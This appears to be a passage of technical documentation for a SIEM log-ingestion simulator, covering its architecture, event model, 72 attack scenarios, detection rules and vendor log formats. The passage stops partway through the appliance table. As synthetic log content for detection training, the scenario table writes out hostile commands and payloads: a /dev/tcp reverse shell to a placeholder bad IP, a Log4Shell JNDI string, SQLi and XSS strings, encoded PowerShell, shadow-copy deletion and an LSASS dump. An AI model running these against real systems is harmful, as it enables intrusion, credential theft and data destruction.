# APEX JediSyslogger — Technical Documentation

A browser-based **SIEM log-ingestion simulator** with an optional zero-dependency
Node backend for real syslog forwarding. This document is the full reference:
architecture, data model, every scenario and detection rule, the vendor log
formats, the HTTP API, configuration, and deployment.

- [1. Overview](#1-overview)
- [2. Architecture](#2-architecture)
- [3. Event data model](#3-event-data-model)
- [4. The Syslogger (log source)](#4-the-syslogger-log-source)
- [5. Attack scenarios](#5-attack-scenarios)
- [6. Appliance log formats](#6-appliance-log-formats)
- [7. The Jedi SIEM engine](#7-the-jedi-siem-engine)
- [8. Detection rules](#8-detection-rules)
- [9. File replay](#9-file-replay)
- [10. Live forwarding & the backend API](#10-live-forwarding--the-backend-api)
- [11. Connectivity test](#11-connectivity-test)
- [12. Configuration reference](#12-configuration-reference)
- [13. Accounts, sign-in and per-user settings](#13-accounts-sign-in-and-per-user-settings)
- [14. Deployment](#14-deployment)
- [15. Extending the app](#15-extending-the-app)
- [16. The terminal build](#16-the-terminal-build)
- [17. Troubleshooting](#17-troubleshooting)

---

## 1. Overview

APEX JediSyslogger generates synthetic security telemetry and analyses it in real
time, so you can practise **detection engineering** without a live environment. It
has two halves:

| Component     | Role |
|---------------|------|
| **Syslogger** | Synthetic log source — emits RFC 3164 / RFC 5424 syslog and 42 appliance formats (29 native syslog + 4 agent-relayed + 9 API-relayed), at a configurable rate, with 72 injectable attack scenarios and file replay. |
| **Jedi**      | Miniature SIEM — parses every event, keeps rolling stats, and runs a stateful, MITRE ATT&CK-tagged detection-rule engine. |

Everything renders in the browser. The optional `server.js` backend serves the
app **and** relays generated logs to an external collector — as real UDP/TCP
syslog, or as Splunk HEC events over HTTP(S). Because that relay can put real
traffic on your network, the backend requires a **password plus a TOTP second
factor** before it answers anything, and keeps a **separate Log Collector per
account** (§13).

All traffic is synthetic. Nothing leaves the browser unless you explicitly enable
**Forward live** (which requires the backend).

---

## 2. Architecture

```
┌──────────────────────── Browser ────────────────────────┐
│                                                          │
│  Syslogger ──emit(event)──▶ Jedi.ingest(event)           │
│  (js/syslogger.js)          (js/jedi.js)                 │
│      │                          │                        │
│      │ raw line                 │ stats + alerts         │
│      ▼                          ▼                        │
│  fwd queue ······▶ POST /forward   UI render (js/ui.js)  │
│                          │         dashboard / stream    │
└──────────────────────────┼──────────────────────────────┘
                           │  (only when "Forward live" is on)
                           ▼
              ┌──────── server.js (Node) ────────┐
              │  /forward → UDP/TCP syslog ───────┼──▶ Collector / SIEM
              │           → Splunk HEC (HTTPS)    │    (Splunk, Graylog,
              │  /test    → reachability probe    │     Wazuh, rsyslog…)
              │  static file host                 │
              └───────────────────────────────────┘
```

**Files**

| File | Responsibility |
|------|----------------|
| `index.html` | Markup / panel scaffold |
| `login.html` | Password + two-factor sign-in page |
| `css/styles.css` | Dark SIEM theme, responsive layout |
| `js/data.js` | Random helpers, host/user/threat-intel pools, RFC 3164/5424 + vendor line formatters |
| `js/syslogger.js` | Baseline generators, attack scenarios, appliance sources, file replay, forward queue |
| `js/jedi.js` | Parsing, correlation windows, detection rules, stats, threat level |
| `js/ui.js` | Dashboard rendering, charts, config wiring, drawer |
| `js/login.js` | The two-step sign-in flow on `login.html` |
| `js/qr.js` | QR encoder (ISO/IEC 18004) for the 2FA enrolment code — browser and console |
| `account.html` | Profile, password, second factor, and the admin user list |
| `js/account.js` | The Account page's logic |
| `auth.js` | Accounts: scrypt passwords, RFC 6238 TOTP, roles, sessions, lockout, per-user collector (§13) |
| `auth.json` | Generated per install: every account plus its saved collector (`0600`, gitignored, never served). Beside the code in a checkout; under the user's data directory when the app is installed read-only (§13.2) |
| `server.js` | Optional backend: static host + `/forward` relay + `/test` probe + the sign-in gate |
| `samples/sample.log` | Example mixed-format log for the file-replay demo |
| `CONNECTORS.md` | How to configure the agent- and API-relayed sources for real: agent config, connector design, Microsoft 365 / Entra / Defender, permissions |
| `js/version.js` | The one version number. Dual-mode: a browser global and a `require()` for Node. Everything else reads it (§16.4) |
| `jedi-cli.js` | The terminal build — live dashboard and headless CLI over the same engine (§16) |
| `desktop.js` | The desktop launcher: loopback backend, one-shot launch ticket, chromeless window (§16.7) |
| `packaging/icons/` | Icon set, plus the hand-built `.ico` and `.icns` containers |
| `forward.js` | The wire: UDP/TCP relays, the Splunk HEC poster, and the three connectivity probes. Required by both `server.js` and `jedi-cli.js` |
| `bin/jedi`, `bin/jedi.cmd` | Launchers for POSIX and Windows |
| `updater.js` | The update client: fetch, **verify the Ed25519 signature**, then compare versions (§16.6) |
| `packaging/` | `build.sh`, `build-deb.sh`, `bundle.js`, `version.sh`, `sign.js`, `install.ps1`, `PKGBUILD`, the RPM spec, the Homebrew formula, the systemd unit |
| `jsconfig.json` | Editor typecheck settings — read by the editor, never shipped |
| `types/globals.d.ts` | Ambient declarations for `window.JS` and Node globals |

The three engine modules are plain IIFEs that attach to a global `JS` namespace —
no build step, no bundler, no npm dependencies. Load order is version → data →
syslogger → jedi → ui, though only the last three actually depend on order:
`js/version.js` and `js/data.js` both *merge* into `JS` rather than replacing it.

Each engine module ends with the same two lines:

```js
  if (typeof module === 'object' && module.exports) module.exports = global.JS;
})(typeof window !== 'undefined' ? window : globalThis);
```

That is what lets `jedi-cli.js` `require()` the identical files the browser loads
(§16). There is no Node-specific copy of the generator or the rules, and there is
no bundler in between — the terminal build cannot drift from the web app because
it *is* the web app's engine.

`jsconfig.json` and `types/globals.d.ts` are editor-only: VS Code's bundled
TypeScript service reads them to typecheck the JavaScript in place, so no
`npm install` is required and nothing is added to what the browser loads. To run
the same check from a terminal: `npx -p typescript tsc -p jsconfig.json`.

---

## 3. Event data model

Every generated or parsed log is normalised into an **event object** before Jedi
sees it. Common fields:

| Field | Meaning |
|-------|---------|
| `id` | Random unique id |
| `ts` | Epoch ms timestamp |
| `srcType` | Source category — generic (`firewall`, `ssh`, `web`, `dns`, `vpn`, `windows`, `mail`), one of the 42 appliance keys (`paloalto`, `snort`, `bind`, `snare`, `sysmon`, `zeek`, `cloudtrail`, `okta`, `ciscoesa`, `cyberark`, `ivanti`, `infoblox`, `veeam`, `umbrella`, `azure`, `m365`, `entra`, `defender`, …), or `file` |
| `host` / `hostIp` | Device name / management IP |
| `facility` / `severity` | Syslog numeric facility (0–23) and severity (0–7) |
| `program` / `pid` | Process / tag |
| `srcIp` / `dstIp` / `srcPort` / `dstPort` / `proto` | Network 5-tuple (where relevant) |
| `action` | `ALLOW` / `DENY` / `accept` / `dropped` / etc. |
| `bytes` | Flow size |
| `user`, `eventId`, `url`, `method`, `status`, `domain` | Source-specific fields |
| `vendor` | Appliance vendor key (drives the native raw formatter) |
| `threatSig` / `threatSev` | Appliance IPS/WAF signature + severity (drives detection) |
| `message` | Human-readable summary shown in the stream |
| `raw` | The exact wire line (RFC 3164/5424 or vendor format), shown in the drawer |
| `collector` | The configured `ip:port` destination label |

Syslog severity mapping (lower = more severe): `0 emerg, 1 alert, 2 crit,
3 err, 4 warning, 5 notice, 6 info, 7 debug`.

**Source-specific fields.** A formatter reads only the fields its vendor needs, so
some sources add their own. The ones a detection rule reads:

| Field | Source | Meaning |
|-------|--------|---------|
| `sigName` | `snort`, `ciscoftd` | Signature text **for display**. Deliberately separate from `threatSig`: an IDS names every alert, including benign priority-3 noise, but only `threatSig` raises an alert. |
| `gid` / `sid` / `rev` / `classification` / `priority` | `snort`, `ciscoftd` | Snort rule identity and priority |
| `termState` / `timers` / `conns` | `haproxy` | 4-char termination state (`----` clean, `PR--` proxy-denied) and the `Tq/Tw/Tc/Tr/Tt` tuple |
| `qtype` / `qflags` / `clientHandle` | `bind` | DNS query type, trailing flag chars, `@0x…` client handle |
| `iseCategory` / `msgCode` / `mac` / `nasName` / `failReason` | `ciscoise` | Logging category, message code (`5200` pass / `5400` fail), supplicant MAC, NAS, failure text |
| `totalSeg` / `segNum` / `iseSeq` | `ciscoise` | ISE's datagram-segmentation header |
| `criticality` / `logName` / `logType` / `snareCounter` | `snare` | Snare agent fields wrapping the Windows event |
| `auditType` / `auditSerial` / `auditTs` / `auditBody` | `auditd` | Record type (`SYSCALL`/`EXECVE`), and the shared `audit(epoch:serial)` join key — **identical across every record of one event** |
| `auid` / `uid` / `comm` | `auditd` | Login identity (survives `su`/`sudo`), effective uid, command |
| `pfAction` / `smtpCode` / `pfReason` | `postfix` | `reject`/`sent`, SMTP reply code, reason text |
| `sysmonType` / `processGuid` / `processId` / `image` | `sysmon` | Event-ID name, the GUID that survives PID reuse, and the process image path |
| `sysmonFields` | `sysmon` | Per-event-ID fields, pre-rendered as `key="value"` strings — every Sysmon event ID has a different schema, so the formatter only supplies the common header |
| `zeekPath` / `uid` / `zeekFields` | `zeek` | Log path (`conn`/`dns`/`ssl`), the connection uid that joins them, and the path's positional field list |
| `eventName` / `eventSource` / `requestParameters` | `cloudtrail` | The API call, its service, and its arguments — `cloud-threat` branches on the name and inspects the parameters |
| `identityType` / `arn` / `accountId` / `region` | `cloudtrail` | `userIdentity` block: who made the call, in which account and region |
| `oktaEventType` / `outcome` / `outcomeReason` / `factor` | `okta` | Event type, `SUCCESS`/`FAILURE`, the reason text, and the MFA factor used |
| `country` / `city` / `lat` / `lon` / `isProxy` | `okta` | `client.geographicalContext` — what makes impossible travel detectable at all |

---

## 4. The Syslogger (log source)

`Syslogger(sink)` emits events to a `sink` callback (Jedi's `ingest`).

**Baseline traffic** — a weighted mix of benign events from firewall, web, ssh,
dns, windows, and vpn, produced on a 100 ms tick at the configured **events per
second** (0–60). Fractional rates accumulate so e.g. 0.5 eps emits one event
every two seconds.

**Key methods**

| Method | Purpose |
|--------|---------|
| `start()` / `stop()` | Run/pause the baseline generator |
| `setEps(n)` | Baseline rate |
| `setFormat('rfc3164' \| 'rfc5424')` | Wire format for the generic sources |
| `injectScenario(id)` | Fire an attack/appliance burst (works even while stopped) |
| `setMaxEvents(n \| null)` | Total volume cap (auto-stops at the cap) |
| `setCollector(ip, port)` | Forwarding/test destination (IP or hostname) |
| `loadFile(lines, name)` / `setFileMode(bool)` / `setLoop(bool)` | File replay |
| `setForwarding(bool)` / `setForwardProto('udp' \| 'tcp' \| 'hec')` | Live forwarding |
| `setHec({token, index, sourcetype, ssl, insecure})` | Splunk HEC settings (merged into `syslogger.hec`) |

The **RFC 3164** vs **RFC 5424** toggle only affects the generic sources;
appliance events always use their native vendor format.

---

## 5. Attack scenarios

**72** scenarios live under the **Attack ›** menu. Each scenario's `build()`
returns a *burst* of event partials crafted to trip a specific detection rule, so
every button demonstrably lights up the dashboard. A burst can be injected even
while the baseline generator is stopped, and its events are spread 30–90 ms apart
so the correlation windows see them as live traffic.

Scenarios are defined in `js/syslogger.js` in three objects that are merged into a
single `SCENARIOS` map: the original set in `SCENARIOS`, the bulk of the
techniques in `MORE_ATTACKS`, and the product-targeted pack in `PRODUCT_ATTACKS`
(§5.1). The **ID** column below is the internal key passed to
`injectScenario(id)`; it is what the `Attack ›` buttons call.

| ID | Scenario | What the burst emits | Fires rule | ATT&CK |
|----|----------|----------------------|-----------|--------|
| `ssh-bruteforce` | SSH Brute Force | 12–20 `sshd` *Failed password* lines from one threat-intel IP; ~30 % of the time a trailing *Accepted password* | `ssh-bruteforce`, `brute-success` | T1110 / T1078 |
| `port-scan` | Port Scan | 20–30 firewall **DENY** events to distinct dst ports on one internal host | `port-scan` | T1046 |
| `sql-injection` | SQL Injection | 3–5 nginx requests with SQLi payloads (`' OR '1'='1`, `UNION SELECT`, `; DROP TABLE`, `SLEEP(5)`) | `sql-injection` | T1190 |
| `c2-beacon` | C2 Beacon | 4–7 firewall **ALLOW** flows from an internal victim to a known-bad IP on 443 / 8443 / 4444 | `c2-beacon` | T1071 |
| `data-exfil` | Data Exfiltration | one firewall **ALLOW** flow of 220–900 MB outbound | `data-exfil` | T1048 |
| `dns-tunneling` | DNS Tunneling | 4–8 DNS **TXT** queries with 40–60-char hex labels under a known-bad domain | `dns-tunneling` | T1071.004 |
| `priv-esc` | Privilege Escalation | a `sudo … USER=root ; COMMAND=/bin/bash` event **plus** a Windows **4672** SeDebugPrivilege event | `priv-esc` | T1068 |
| `malware-detected` | Malware / IDS Hit | one Suricata alert (Cobalt Strike / Emotet / Log4j / PowerShell EncodedCommand) | `ids-malware` | T1204 |
| `log4shell` | Log4Shell RCE | 2–3 web requests carrying `${jndi:ldap://<bad-ip>:1389/Exploit}` in the URL / User-Agent | `web-exploit` | T1190 |
| `xss` | XSS Injection | 2–3 web requests with `<script>` / `onerror=` payloads | `web-exploit` | T1059 |
| `dir-traversal` | Path Traversal / LFI | 2–3 web requests for `../../../../etc/passwd`, `/etc/shadow`, `win.ini` | `web-exploit` | T1083 |
| `web-shell` | Web Shell | 2–3 **POST**s to `shell.php?cmd=`, `c99.php`, `webshell.aspx` | `web-exploit` | T1505.003 |
| `vuln-scan` | Vuln Scan | 5–8 GETs to sensitive paths (`/admin`, `/.git/config`, `/.env`…) with a scanner UA (sqlmap / Nikto / Nessus / Nmap) | `web-exploit` | T1595 |
| `reverse-shell` | Reverse Shell | one shell event `bash -i >& /dev/tcp/<bad-ip>/4444 0>&1` | `reverse-shell` | T1059 |
| `powershell-enc` | Malicious PowerShell | Windows **4688** with `powershell -nop -w hidden -enc <base64>` | `susp-powershell` | T1059.001 |
| `rdp-bruteforce` | RDP Brute Force | 10–16 Windows **4625** LogonType 10 failures from one threat-intel IP | `windows-threat` | T1110 |
| `password-spray` | Password Spray | **4625** across 10 distinct accounts with one password, from one IP | `windows-threat` | T1110.003 |
| `kerberoasting` | Kerberoasting | **4769** RC4 (`0x17`) service-ticket requests for 4 service accounts | `windows-threat` | T1558.003 |
| `dcsync` | DCSync | **4662** with `DS-Replication-Get-Changes-All` replication rights | `windows-threat` | T1003.006 |
| `new-admin` | New Admin Account | **4720** (account created) **+ 4732** (added to Administrators) | `windows-threat` | T1136 |
| `log-cleared` | Audit Log Cleared | **1102** security audit log cleared | `windows-threat` | T1070.001 |
| `pass-the-hash` | Pass-the-Hash | **4624** LogonType 9 / NTLM logon | `windows-threat` | T1550.002 |
| `ransomware` | Ransomware | **4688** `vssadmin delete shadows` + `bcdedit … recoveryenabled no` + **4663** mass `.locked` rename | `ransomware` | T1486 |
| `cryptomining` | Cryptomining | DNS query to a mining pool **plus** a firewall flow to `stratum+tcp://<pool>:3333` | `cryptomining` | T1496 |
| `ddos-synflood` | SYN Flood (DDoS) | 8–12 firewall **DENY** SYN-flood events to one target from spoofed IPs | `dos-flood` | T1498 |
| `phishing` | Phishing Email | one postfix event, `spf=fail dkim=fail dmarc=fail` + a risky attachment (`.exe/.iso/.js/.docm`) | `phishing` | T1566 |
| `lsass-dump` | LSASS Credential Dump | Sysmon **1** `rundll32 comsvcs.dll, MiniDump` + Sysmon **10** handle into `lsass.exe`, `GrantedAccess 0x1410` | `cred-dumping` | T1003.001 |
| `sched-task-persist` | Scheduled Task Persistence | Sysmon **1** `schtasks /create … /sc minute /ru SYSTEM` + Windows **4698** | `persistence-mech` | T1053.005 |
| `runkey-persist` | Run-Key Persistence | Sysmon **11** drop into `C:\Users\Public\Libraries` + Sysmon **13** write under `CurrentVersion\Run` | `persistence-mech` | T1547.001 |
| `lolbin-download` | LOLBin Download (certutil) | Sysmon **1** `certutil -urlcache -split -f`, **3** the fetch itself, **1** `certutil -decode` | `lolbin-abuse` | T1105 |
| `defender-disabled` | Defender Disabled | Sysmon **1** `Set-MpPreference -DisableRealtimeMonitoring $true` + Windows **4688** `Add-MpPreference -ExclusionPath` | `security-tooling-disabled` | T1562.001 |
| `bloodhound` | BloodHound AD Recon | Sysmon **1** `SharpHound.exe --CollectionMethods All` + 11–15 Windows **4662** directory-object reads | `ad-recon` | T1087.002 |
| `psexec-lateral` | PsExec Lateral Movement | Windows **4624** LogonType 3 (NTLM) + **5140** `ADMIN$` + **7045** `PSEXESVC` service install | `windows-threat` | T1021.002 |
| `golden-ticket` | Golden Ticket | Windows **4769** with a blank `Account Domain: -` and an AES256 ticket outside policy | `windows-threat` | T1558.001 |
| `asrep-roast` | AS-REP Roasting | 3–4 Windows **4768** with `Pre-Authentication Type: 0` and an RC4 (`0x17`) ticket | `windows-threat` | T1558.004 |
| `cloud-logging-disabled` | Cloud Logging Disabled | CloudTrail `StopLogging` + `DeleteTrail` + GuardDuty `DeleteDetector` from a threat-intel IP | `cloud-threat` | T1562.008 |
| `cloud-iam-backdoor` | Cloud IAM Backdoor | CloudTrail `CreateUser` + `CreateAccessKey` + `CreateLoginProfile` for a new principal | `cloud-threat` | T1098.001 |
| `cloud-privesc` | Cloud Privilege Escalation | CloudTrail `AttachUserPolicy` (`AdministratorAccess`) + `PutUserPolicy` with `"Action":"*"` | `cloud-threat` | T1098.003 |
| `s3-exposure` | S3 Bucket Exposed | CloudTrail `PutPublicAccessBlock` (off) + `PutBucketAcl` `public-read`/`AllUsers` + `PutBucketPolicy` `Principal:*` | `cloud-threat` | T1530 |
| `impossible-travel` | Impossible Travel | two Okta `user.session.start` **successes** minutes apart from Sydney and Moscow / Lagos / Shenzhen | `identity-threat` | T1078.004 |
| `mfa-fatigue` | MFA Fatigue (Push Bombing) | 8–12 Okta `auth_via_mfa` **FAILURE** (`FAILED_PUSH_VERIFY_REJECTED`) then one **SUCCESS** — the user gives in | `mfa-fatigue` (twice) | T1621 |
| `ssrf-metadata` | SSRF → Cloud Metadata | 1–2 web requests proxying to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | `web-exploit` | T1552.005 |
| `process-injection` | Process Injection | Sysmon **10** `ProcessAccess` with `CreateRemoteThread`-shaped `GrantedAccess` into a live process | `process-injection` | T1055 |
| `browser-cred-theft` | Browser Credential Theft | Sysmon **11** file-create pair reading Chrome `Login Data` **and** `Local State` — the DB plus the key that decrypts it | `password-store-theft` | T1555.003 |
| `masquerading` | Masquerading (fake svchost) | Sysmon **1** `svchost.exe` running from a user-writable path instead of `System32` | `masquerading` | T1036.005 |
| `remote-access-tool` | Remote Access Tool Install | Sysmon **3** outbound connect from an unmanaged remote-support binary (AnyDesk / ScreenConnect class) | `remote-access-tool` | T1219 |
| `sandbox-evasion` | Sandbox / VM Evasion | Sysmon **1** sequence probing for VM artefacts before the payload runs | `sandbox-evasion` | T1497 |
| `tor-egress` | Tor Egress | Squid `TCP_TUNNEL` `CONNECT` to Tor ORPort/DirPort (9001 / 9051) | `covert-c2` | T1090.003 |
| `saas-c2` | C2 over Trusted SaaS | Squid `GET` loop pulling task files from a raw GitHub / paste endpoint on a fixed cadence | `covert-c2` | T1102.002 |
| `cloud-exfil` | Exfil to Cloud Storage | one Squid `PUT` of ~1 GB to Dropbox / Mega / transfer.sh | `cloud-exfil` | T1567.002 |
| `net-config-tamper` | Network Config Tampering | Cisco IOS `%SYS-5-CONFIG_I` removing `logging host` / an ACL from vty | `net-config-change` | T1562.004 |
| `citrix-exploit` | Citrix Gateway Exploit | NetScaler `SSLVPN` session reuse from a known-bad IP against an admin context | `appliance-threat` | T1190 |
| `vpn-cred-stuffing` | VPN Credential Stuffing | 8–10 NetScaler `AAA LOGIN_FAILED` for distinct users from one IP | `vpn-brute` | T1110.004 |
| `esxi-ransomware` | ESXi Ransomware Prep | ESXi `vpxa` shell events mass-killing VMs (`esxcli vm process kill`) before encryption | `hypervisor-threat` | T1562.001 |
| `k8s-container-escape` | Container Escape (K8s) | audit records creating a privileged / `hostPID` pod and `exec`-ing into it | `k8s-threat` | T1611 |
| `legacy-auth-bypass` | Legacy Auth MFA Bypass | Entra sign-in succeeding over IMAP4 / POP3 with Conditional Access `notApplied` | `identity-threat` | T1078.004 |
| `oauth-consent-phish` | OAuth Consent Phishing | Entra consent grant to a third-party app requesting mail and file scopes | `identity-threat` | T1528 |
| `gpo-modification` | GPO Modification | Windows **5136** modifying a `groupPolicyContainer` object | `windows-threat` | T1484.001 |
| `adcs-esc1` | ADCS Certificate Theft (ESC1) | Windows **4887** issuing a certificate whose subject is a different (privileged) account | `windows-threat` | T1649 |
| `wmi-lateral` | WMI Lateral Movement | Sysmon **3** connect to 135/DCOM followed by the remote process create | `lateral-exec` | T1047 |
| `m365-mail-exfil` | Exchange Online Mailbox Exfil | 9–14 unified-audit `MailItemsAccessed` records with `MailAccessType: Sync` across six folders, all from one threat-intel IP | `cloud-threat` | T1114.002 |
| `m365-transport-rule` | Exchange Transport Rule Tamper | `New-TransportRule` with `BlindCopyTo` an external address, then `Set-TransportRule` `SetSCL -1` for external senders | `cloud-threat` | T1114.003 |
| `m365-sharepoint-download` | SharePoint Mass Download | 14–20 `FileDownloaded` / `FileSyncDownloadedFull` records against a Finance site from one address | `cloud-threat` | T1213.002 |
| `m365-anon-sharing` | OneDrive Anonymous Sharing | `AnonymousLinkCreated` (Anonymous Edit, no expiry) + `SharingInvitationCreated` to an external address + `AnonymousLinkUsed` | `cloud-threat` | T1567 |
| `m365-teams-external` | Teams External Access Abuse | `TeamSettingChanged` enabling guest access, then `MemberAdded` putting an external guest in a private team | `cloud-threat` | T1199 |
| `m365-audit-disabled` | M365 Audit Logging Disabled | `Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled False` + `Set-Mailbox -AuditEnabled False` | `cloud-threat` | T1562.008 |
| `m365-ediscovery` | eDiscovery Search Abuse | Purview `SearchCreated` / `SearchStarted` / `SearchExported` over **All** mailboxes with a credential-hunting query | `cloud-threat` | T1213 |
| `m365-power-automate` | Power Automate Exfil Flow | `CreateFlow` + `EditFlow` wiring the Office 365 Outlook connector to an HTTP POST at a known-bad host | `cloud-threat` | T1567 |
| `entra-mfa-tamper` | Rogue MFA Method Registered | Entra `AuditLogs` — *User registered security info* (an Authenticator added), then *User deleted security info* (the original SMS method removed) | `identity-threat` | T1556.006 |
| `entra-ca-tamper` | Conditional Access Weakened | Entra `AuditLogs` — *Update conditional access policy*: state dropped to report-only and one account excluded | `identity-threat` | T1556.009 |
| `mde-tamper` | Defender EDR Tampering | three Defender for Endpoint alerts — tamper protection off, scan exclusion added, sensor stopped | `security-tooling-disabled` | T1562.001 |
| `exchange-proxynotshell` | Exchange ProxyNotShell | `POST /autodiscover/autodiscover.json?@…/powershell/`, the Sysmon **11** shell drop into `owa\auth`, then a `GET` on the shell | `web-exploit` (twice) | T1190 · T1505.003 |

Most bursts raise exactly **one** alert. `mfa-fatigue` deliberately raises two — the
push-bombing burst, then the approval that follows it — the same shape as
`ssh-bruteforce` → `brute-success`. The web scenarios alert per request, because
each request is independently an attack; `exchange-proxynotshell` raises two for
that reason (the exploit, then the web shell it dropped being used).

### 5.1 The product pack

The last twelve scenarios in the table are `PRODUCT_ATTACKS`. They differ from
the rest in what they are aimed at: not a technique in the abstract but **one
product's own log source**, in the record shape that product really writes. Eight
of them ride the Office 365 unified audit log, two the Entra ID directory audit,
one Defender for Endpoint's alert feed, one on-prem Exchange.

They exist because the Microsoft estate is where most detection engineering
actually happens, and because its telemetry looks nothing like syslog:

- **One feed, a dozen products.** Exchange Online, SharePoint, OneDrive, Teams,
  Purview and Power Automate all arrive on the same Office 365 feed, told apart
  only by `Workload` + `Operation`. That is why `cloud-threat` handles Microsoft
  365 with a lookup table (`m365Verdict()` in `js/jedi.js`) rather than a chain of
  conditions — the shape of the rule follows the shape of the feed.
- **Two schemas from one Entra connector.** `SignInLogs` records who
  authenticated; `AuditLogs` records what changed in the directory. Most teams
  collect the first and miss the second — which is where account takeover turns
  into persistence (`entra-mfa-tamper`, `entra-ca-tamper`).
- **A verdict is not telemetry.** `mde-tamper` is Defender alerting on Defender
  being switched off. The command lines stay in `ProcessCommandLine` where the
  sensor put them, so the burst reads as one tamper story rather than three
  separate findings.
- **None of it is syslog.** Every source these scenarios use is `api`-transport.
  `CONNECTORS.md` is the guide to standing the connectors up for real.

The known-bad IPs and domains used above come from `THREAT_INTEL` in `js/data.js`
(e.g. `185.220.101.44`, `kx7z2q-c2.badnet.ru`); the Jedi engine treats them as
threat-intel matches.

---

## 6. Appliance log formats

**42** sources live under the **Appliance logs ›** menu. Each burst mixes benign
events with malicious ones, and every event is rendered in the vendor's **real
wire format** (still wrapped in a syslog `<PRI>` header) by the matching formatter
in `js/data.js` → `VENDOR_FORMATTERS`. The RFC 3164 / 5424 toggle does **not**
apply — real appliances have fixed formats. The **ID** column is the internal key
the `Appliance logs ›` buttons pass to `injectScenario(id)`.

Selecting an appliance also **scopes the live stream** to it. `setApplianceSources(ids)`
holds the selected ids; while the list is non-empty `_emitBaseline()` defers to
`_emitAppliance()`, which drips one selected appliance's burst out an event at a
time (so the EPS setting still holds) instead of drawing from the generic
`BASELINE` mix. Streamed bursts carry only their leading routine traffic, with a
whole burst — malicious tail included — let through every ~30 s, so a sustained
feed doesn't flood **Detections**. A file replay still takes precedence, and
clicking a selected appliance again (or **clear** / **Reset**) restores the mix.

`Syslogger.scenarioList()` exposes a **`transport`** field (`native` | `agent` |
`api`, defaulting to `native`). 29 of the 42 sources are `native` — the device
speaks syslog itself. Thirteen are not, and say so with a badge on their button and
in the hover title.

**`agent`** — the telemetry exists locally but something else has to put it on the
wire:

- **`snare`** — Windows has no native syslog at all; a Snare or NXLog agent reads
  the Event Log and relays it.
- **`sysmon`** — Sysmon writes to its own channel
  (`Microsoft-Windows-Sysmon/Operational`), so it rides the same agent as the
  Security channel; the payload here is NXLog's `key=value` rendering.
- **`auditd`** — the kernel audit daemon writes to its own socket; the
  `audisp-syslog` plugin is what puts it on the wire.
- **`zeek`** — Zeek writes log *files* under `/opt/zeek/logs/current`, one per
  path; Filebeat or `rsyslog imfile` ships them.

**`api`** — the product emits nothing at all on a socket; a connector polls it and
re-emits the JSON:

- **`cloudtrail`** — records are delivered to S3 or EventBridge, not syslog.
- **`okta`** — the System Log is read from `GET /api/v1/logs`.
- **`entra`** — `SigninLogs` come out through Graph or an Event Hub.
- **`crowdstrike`** — the Falcon SIEM Connector polls the Event Streams API.
- **`k8saudit`** — the API server writes an audit *file* or webhook, not syslog.
- **`umbrella`** — resolver logs are dropped as CSV into a managed S3 bucket (or
  pulled from the Reporting API).
- **`azure`** — the Activity Log is read from an Event Hub or the Monitor API.
- **`m365`** — the unified audit log comes from the Office 365 Management
  Activity API.
- **`defender`** — Defender for Endpoint publishes through the Defender XDR
  streaming API (an Event Hub or storage account) or the alerts API; there is no
  syslog anywhere in the product.

**Configuring these for real** — agent config files, connector design, the
Microsoft 365 / Entra ID / Defender feeds, the exact permissions each one needs,
and how to prove the path with this simulator — is
[`CONNECTORS.md`](CONNECTORS.md).

The distinction is deliberate: this is a tool for learning log ingestion, so a
source that cannot actually reach a collector without an agent or a connector must
not be presented as though it could.

Five detection paths cover the malicious events in each burst:

- Appliances that carry an IPS/WAF **`threatSig`** field (Palo Alto, FortiGate,
  Sophos, SonicWall, Zscaler, F5, Cisco FTD, Snort, HAProxy, Postfix, CEF, LEEF)
  fire the **`appliance-threat`** rule, which maps the signature text to an ATT&CK
  technique.
- Pure firewall appliances with no signature field (Cisco ASA, Check Point,
  pfSense, Juniper) route their malicious event through the generic
  **`c2-beacon`** rule instead (internal host → threat-intel IP). **Zeek** lands
  here too: its `conn.log` beacon to a known-bad IP is the same evidence.
- **Correlation-driven** sources carry no signature at all and rely on a stateful
  rule counting a burst: Cisco ISE (`radius-brute`), BIND 9 (`dns-tunneling`),
  Snare (`windows-threat`) and Okta (`mfa-fatigue`). These deliberately alert
  **once** per burst rather than once per line.
- **Behavioural** sources are judged on what the telemetry *describes* rather than
  on a vendor verdict: Sysmon's handle request into `lsass.exe` fires
  **`cred-dumping`**, CloudTrail's control-plane call fires **`cloud-threat`**, and
  Veeam's repository deletion fires **`ransomware`** (as T1490, the prelude rather
  than the encryption itself).
- **Reused rules.** `snare` is the same Windows Event Log as the `windows` baseline
  source — same event IDs, different transport and wire format — so it feeds the
  existing **`windows-threat`** rule instead of a cloned one. `auditd` gets its own
  **`auditd-rootshell`** rule. The same reasoning extends each rule to a second
  schema rather than cloning it: `ciscoesa` joins the `mail` baseline on
  **`phishing`**, `ivanti` joins NetScaler on **`vpn-brute`**, `infoblox` and
  `umbrella` join BIND on **`dns-tunneling`**, `cyberark` adds a vault branch to
  **`password-store-theft`**, and `azure` and `m365` join CloudTrail on
  **`cloud-threat`** — three control planes, one rule. `defender` is the newest
  case: an EDR verdict is the same shape as an IPS signature, so it feeds
  **`appliance-threat`** — but because Defender ships `AttackTechniques` with
  every alert, the rule now takes the sensor's own ATT&CK mapping (`threatTactic`
  / `threatTechnique`) in preference to guessing one from the signature text.

| ID | Appliance | Format | Detection | Malicious signature / trigger |
|----|-----------|--------|-----------|-------------------------------|
| `paloalto` | Palo Alto (PAN-OS) | CSV | `appliance-threat` | Log4j RCE (91991), SQLi (20568), EternalBlue (40007), Dir Traversal (31337) |
| `fortigate` | FortiGate (FortiOS) | `key=value` | `appliance-threat` | Log4j (51006), SMB OOB read (41435), Cobalt Strike (46774), SQLi (15621) |
| `ciscoasa` | Cisco ASA | `%ASA-lvl-id` | `c2-beacon` | outbound *Built* connection to a known-bad IP (+ inbound `106023` Deny) |
| `checkpoint` | Check Point | `k=v;` | `c2-beacon` | *Accept* to a flagged destination (+ a `Drop`) |
| `sophos` | Sophos XG | `key=value` | `appliance-threat` | SQL-Injection-Attack, Log4j (CVE-2021-44228), Suspicious-Executable-Download |
| `pfsense` | pfSense | filterlog CSV | `c2-beacon` | *pass out* to a flagged destination |
| `juniper` | Juniper SRX | RT_FLOW | `c2-beacon` | RT_FLOW session *created* to a flagged destination |
| `sonicwall` | SonicWall | `id/sn key=value` | `appliance-threat` | Suspected Port Scan, Possible SYN Flood, Malformed packet |
| `zscaler` | Zscaler ZIA | NSS `key=value` | `appliance-threat` | Win32.Trojan.Emotet, JS.Downloader.GenericKD, EICAR-Test-File, Phishing.Kit |
